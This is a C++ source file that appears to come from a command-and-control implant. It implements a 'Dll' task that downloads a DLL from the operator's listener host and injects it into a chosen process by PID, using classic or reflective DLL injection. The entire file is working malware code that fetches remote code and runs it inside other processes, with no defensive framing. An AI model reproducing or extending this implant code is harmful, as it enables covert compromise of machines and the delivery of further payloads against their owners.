#include "core/task.hpp"

namespace Task
{
    // Load DLL and spawn modules.
    std::wstring Dll(
        State::PSTATE pState,
        const std::wstring& wPid,
        const std::wstring& wSrc,
        const std::wstring& wTechnique
    ) {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Download DLL
        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
        std::vector<BYTE> bytes = System::Http::DataDownload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wSrc
        );
        if (bytes.size() == 0)
        {
            return L"Error: Failed to get DLL.";
        }

        // Inject DLL
        if (wcscmp(wTechnique.c_str(), L"dll-injection") == 0)
        {
            if (!Technique::Injection::DllInjection(pState->pProcs, dwPid, bytes))
            {
                return L"Error: Failed to inject DLL.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"reflective-dll-injection") == 0)
        {
            if (!Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dwPid, bytes))
            {
                return L"Error: Failed to inject DLL.";
            }
        }
        else
        {
            return L"Error: Invalid technique.";
        }

        return L"Success: Dll injected successfully.";
    }
}